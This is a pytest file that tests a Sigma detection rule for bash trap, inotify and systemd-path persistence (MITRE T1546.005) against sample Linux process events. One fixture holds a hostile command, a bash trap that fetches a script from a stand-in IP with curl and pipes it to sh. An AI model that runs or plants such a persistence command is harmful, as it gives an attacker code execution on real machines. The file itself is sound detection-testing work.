"""Tests for the T1546.005 Event Triggered Execution Sigma rule.

Lives in server/rules/builtin/mitre_attack/T1546_event_triggered_execution.yml
and is exercised end-to-end through SigmaRuleRunner.

Covers:
- bash trap on SIGINT/EXIT/TERM with custom command         → fires
- inotifywait watching /etc/passwd                          → fires
- inotifywatch writing to log file                          → fires
- systemd-path / systemd path unit creation                 → fires
- apt-get post-install script containing 'trap' as a word   → does NOT fire
- plain interactive bash (no trap, no inotify)              → does NOT fire
- unrelated process (ls)                                    → does NOT fire
- substring trap: 'inotifywait' appears in apt-get command  → does NOT fire
  (filter_pkg_manager wins)
- substring trap: /var/cache/trapper is NOT a filter keyword
  → no false positive from keyword substring
"""
from __future__ import annotations

import uuid
from datetime import datetime, timezone
from pathlib import Path

import pytest

from tests.fake_redis import FakeRedis
from zaqorincore_server.detectors.base import ParsedEvent
from zaqorincore_server.rule_engine.runner import SigmaRuleRunner
from zaqorincore_server.rule_engine.sigma import load_rules_from_dir

RULE_ID = "c4a5e2b7-1d6f-4a3e-9c2b-7e8f5d1a0b3c"


def _rules() -> list:
    return load_rules_from_dir(Path("rules/builtin/mitre_attack"))


def _find(rules: list):
    return next(r for r in rules if r.id == RULE_ID)


def _event(process: str, command: str, **md) -> ParsedEvent:
    meta = {
        "event_type": "process_create",
        "process": process,
        "command": command,
        "user": "alice",
    }
    meta.update(md)
    return ParsedEvent(
        event_id=uuid.uuid4(),
        host_id=uuid.uuid4(),
        source="linux.audit.execve",
        raw="",
        metadata=meta,
        occurred_at=datetime.now(timezone.utc),
    )


@pytest.mark.asyncio
async def test_bash_trap_sigterm_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/bin/bash",
            "bash -c 'trap \"curl http://203.0.113.10/x.sh|sh\" SIGTERM; sleep 9999'",
        )
    )
    assert len(fires) == 1
    assert fires[0].rule.id == RULE_ID


@pytest.mark.asyncio
async def test_bash_trap_exit_with_command_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/bin/bash",
            "bash -c 'trap \"/tmp/cleanup.sh\" EXIT'",
        )
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_inotifywait_watching_passwd_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/bin/inotifywait",
            "inotifywait -m /etc/passwd",
        )
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_inotifywatch_logging_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/bin/inotifywatch",
            "inotifywatch -t 60 /var/spool/cron",
        )
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_systemd_path_unit_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/bin/systemd-path",
            "systemd-path",
        )
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_apt_postinst_with_trap_keyword_does_not_fire() -> None:
    """apt-get process excluded via filter_pkg_manager even though 'trap'
    appears as a substring elsewhere in the command."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/bin/apt-get",
            "apt-get install -y somepkg && bash -c 'trap \"echo ok\" EXIT'",
        )
    )
    assert fires == []


@pytest.mark.asyncio
async def test_plain_bash_interactive_does_not_fire() -> None:
    """A bare interactive bash launch with no trap/inotify must NOT fire."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/bin/bash",
            "bash",
        )
    )
    assert fires == []


@pytest.mark.asyncio
async def test_unrelated_process_does_not_fire() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/bin/ls", "ls -la /var/log/")
    )
    assert fires == []


@pytest.mark.asyncio
async def test_substring_trap_path_does_not_match() -> None:
    """Anti-substring safety: a path containing 'trapper' (which contains
    'trap' as a substring) must NOT spuriously match. Trap pattern requires
    \\btrap\\s+ — a word-boundary anchored match, not a substring.
    """
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/bin/ls", "ls /var/cache/trapper")
    )
    assert fires == []